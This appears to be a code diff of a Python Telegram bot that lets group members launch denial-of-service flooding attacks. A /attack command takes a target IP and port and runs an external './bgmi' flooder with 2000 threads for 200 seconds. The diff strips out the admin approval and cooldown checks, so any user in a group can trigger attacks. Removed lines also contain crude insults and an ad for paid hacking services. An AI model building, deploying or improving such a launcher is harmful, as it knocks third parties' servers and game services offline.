@@ -1,168 +1,49 @@
 import subprocess
 import json
 import os
+import datetime
 import asyncio
-from telegram import Update, Chat, InputFile
+from telegram import Update, Chat
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from config import BOT_TOKEN, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO
-import time
+from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 USER_FILE = "users.json"
-ADMIN_FILE = "admins.json"
-DEFAULT_THREADS = 1500
-DEFAULT_PACKET = 20
-DEFAULT_DURATION = 240  # Default attack duration
-
-# Store the last attack time for each user (in seconds)
-last_attack_time = {}
-
-# Set a timeout in seconds (e.g., 60 seconds between attacks)
-ATTACK_TIMEOUT = 260  # Example: 60 seconds timeout
+DEFAULT_THREADS = 2000
+DEFAULT_PACKET = 10
+DEFAULT_DURATION = 200  # Set default duration (e.g., 60 seconds)
 
 users = {}
-admins = {}
-user_processes = {}
+user_processes = {}  # Dictionary to track processes for each user
 
-def load_data(file):
-    """Load data from a JSON file."""
+def load_users():
     try:
-        with open(file, "r") as f:
-            return json.load(f)
-    except (FileNotFoundError, json.JSONDecodeError):
+        with open(USER_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
+    except Exception as e:
+        print(f"Error loading users: {e}")
         return {}
 
-def save_data(file, data):
-    """Save data to a JSON file."""
-    with open(file, "w") as f:
-        json.dump(data, f)
+def save_users():
+    with open(USER_FILE, "w") as file:
+        json.dump(users, file)
 
-async def check_group(update: Update) -> bool:
-    """Ensure the command is used in a group."""
-    if update.message.chat.type == "private":
-        await update.message.reply_text("❌ GROUP ME JAKE MAA CHUDA APNI. YAHA GAND NA MARA.")
-        return False
-    return True
+async def is_group_chat(update: Update) -> bool:
+    """Check if the chat is a group or supergroup."""
+    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Send bot info and channel link."""
-    if not await check_group(update):
-        return
-
-    chat_id = update.message.chat.id
-    message = (
-        "🚀 **Welcome to the Attack Bot!** 🚀\n\n"
-        "🔹 This bot allows you to launch attacks using /attack.\n"
-        "🔹 Contact me for paid services @Riyahacksyt.\n"
-        "🔹 Join our channel for updates:\n"
-        f"[🔗 Click Here]({CHANNEL_LINK})\n\n"
-        "💻 **Developed by**: " + f"@{OWNER_USERNAME}"
-    )
-
-    if os.path.exists(CHANNEL_LOGO):
-        with open(CHANNEL_LOGO, "rb") as logo:
-            await context.bot.send_photo(chat_id=chat_id, photo=InputFile(logo), caption=message, parse_mode="Markdown")
-    else:
-        await update.message.reply_text(message, parse_mode="Markdown")
-
-async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Owner can promote a user to admin."""
-    if not await check_group(update):
-        return
-
-    if str(update.message.from_user.username) != OWNER_USERNAME:
-        await update.message.reply_text("❌ Only the owner can add admins.")
-        return
-
-    if not context.args:
-        await update.message.reply_text("Usage: /add_admin <user_id>")
-        return
-
-    user_id = context.args[0]
-    admins[user_id] = True
-    save_data(ADMIN_FILE, admins)
-
-    await update.message.reply_text(f"✅ User {user_id} is now an admin.")
-
-async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Owner can demote an admin."""
-    if not await check_group(update):
-        return
-
-    if str(update.message.from_user.username) != OWNER_USERNAME:
-        await update.message.reply_text("❌ Only the owner can remove admins.")
-        return
-
-    if not context.args:
-        await update.message.reply_text("Usage: /remove_admin <user_id>")
-        return
-
-    user_id = context.args[0]
-    if user_id in admins:
-        del admins[user_id]
-        save_data(ADMIN_FILE, admins)
-        await update.message.reply_text(f"✅ User {user_id} is no longer an admin.")
-    else:
-        await update.message.reply_text(f"⚠️ User {user_id} is not an admin.")
-
-async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Admins or owner can approve a user."""
-    if not await check_group(update):
-        return
-
-    user_id = str(update.message.from_user.id)
-    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
-        await update.message.reply_text("❌ Only admins or the owner can add users.")
-        return
-
-    if not context.args:
-        await update.message.reply_text("Usage: /add <user_id>")
-        return
-
-    target_user = context.args[0]
-    users[target_user] = True
-    save_data(USER_FILE, users)
-
-    await update.message.reply_text(f"✅ User {target_user} has been approved.")
-
-async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Admins or owner can revoke a user."""
-    if not await check_group(update):
-        return
-
-    user_id = str(update.message.from_user.id)
-    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
-        await update.message.reply_text("❌ Only admins or the owner can remove users.")
-        return
-
-    if not context.args:
-        await update.message.reply_text("Usage: /remove <user_id>")
-        return
-
-    target_user = context.args[0]
-    if target_user in users:
-        del users[target_user]
-        save_data(USER_FILE, users)
-        await update.message.reply_text(f"✅ User {target_user} has been removed.")
-    else:
-        await update.message.reply_text(f"⚠️ User {target_user} is not in the approved list.")
+async def private_chat_warning(update: Update) -> None:
+    """Send a warning if the bot is used in a private chat."""
+    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Approved users can execute an attack."""
-    if not await check_group(update):
+    if not await is_group_chat(update):
+        await private_chat_warning(update)
         return
 
+    global user_processes
     user_id = str(update.message.from_user.id)
-    if user_id not in users:
-        await update.message.reply_text("❌ You are not approved to use this command. Request approval from an Admin or Owner.")
-        return
-
-    # Check if the user has attacked recently
-    current_time = time.time()
-    last_time = last_attack_time.get(user_id, 0)
-    if current_time - last_time < ATTACK_TIMEOUT:
-        remaining_time = ATTACK_TIMEOUT - (current_time - last_time)
-        await update.message.reply_text(f"⚠️ You must wait {int(remaining_time)} seconds before attacking again.")
-        return
 
     if len(context.args) != 2:
         await update.message.reply_text('Usage: /attack <target_ip> <port>')
@@ -172,77 +53,46 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
 
     if user_id in user_processes and user_processes[user_id].poll() is None:
-        await update.message.reply_text("⚠️ An attack is already running. Please wait.")
+        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
         return
 
-    command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-    process = subprocess.Popen(command)
+    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+
+    # Start the flooding process for the user
+    process = subprocess.Popen(flooding_command)
     user_processes[user_id] = process
 
-    # Record the time of this attack
-    last_attack_time[user_id] = current_time
+    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
 
-    await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')
-
+    # Wait for the specified duration asynchronously
     await asyncio.sleep(DEFAULT_DURATION)
 
+    # Terminate the flooding process after the duration
     process.terminate()
     del user_processes[user_id]
 
-    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.')
-
-async def all_members(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Show all approved users and admins (owner and admins only)."""
-    if not await check_group(update):
-        return
-
-    user_id = str(update.message.from_user.id)
-    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
-        await update.message.reply_text("❌ Only the owner or admins can use this command.")
-        return
-
-    approved_users_list = "\n".join(users.keys()) if users else "No approved users."
-    admins_list = "\n".join(admins.keys()) if admins else "No admins."
-
-    message = f"👥 **Approved Users:**\n{approved_users_list}\n\n👑 **Admins:**\n{admins_list}"
-    await update.message.reply_text(message)
+    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {DEFAULT_DURATION} seconds.')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Display help message."""
-    if not await check_group(update):
+    if not await is_group_chat(update):
+        await private_chat_warning(update)
         return
 
     response = (
-        f"🔹 **Commands:**\n\n"
-        "📌 **User Commands:**\n"
-        "  - `/attack <target_ip> <port>` → Start an attack (Approved users only)\n\n"
-        "🔑 **Admin Commands:**\n"
-        "  - `/add <user_id>` → Approve a user\n"
-        "  - `/remove <user_id>` → Revoke a user's access\n"
-        "  - `/allmembers` → Show all approved users and admins\n\n"
-        "👑 **Owner Commands:**\n"
-        "  - `/add_admin <user_id>` → Make a user an admin\n"
-        "  - `/remove_admin <user_id>` → Remove admin privileges\n"
+        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
+        "User Commands:\n"
+        "/attack <target_ip> <port> - Start a flooding attack with default time and threads.\n"
     )
     await update.message.reply_text(response)
 
 def main() -> None:
-    """Start the bot."""
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("add", add_user))
-    application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("add_admin", add_admin))
-    application.add_handler(CommandHandler("remove_admin", remove_admin))
-    application.add_handler(CommandHandler("allmembers", all_members))
     application.add_handler(CommandHandler("help", help_command))
 
-    global users, admins
-    users = load_data(USER_FILE)
-    admins = load_data(ADMIN_FILE)
-
+    global users
+    users = load_users()
     application.run_polling()
 
 if __name__ == '__main__':
